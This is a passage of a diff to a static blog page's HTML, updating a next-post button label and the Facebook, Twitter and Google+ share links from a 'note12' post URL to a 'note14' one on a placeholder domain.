+                    data-tooltip="note13"
+                    aria-label="NEXT: note13"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -479,7 +505,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/07/30/note12/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/08/01/note14/"
                     title="Share on Facebook"
                     aria-label="Share on Facebook"
                 >
@@ -492,7 +518,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/07/30/note12/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/08/01/note14/"
                     title="Share on Twitter"
                     aria-label="Share on Twitter"
                 >
@@ -505,7 +531,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/07/30/note12/"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/08/01/note14/"
                     title="Share on Google+"
                     aria-label="Share on Google+"
                 >
@@ -539,7 +565,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/07/30/note12/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/08/01/note14/"
                         aria-label="Share on Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
@@ -552,7 +578,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/07/30/note12/"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/08/01/note14/"
                         aria-label="Share on Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
@@ -565,7 +591,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/07/30/note12/"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/08/01/note14/"
                         aria-label="Share on Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
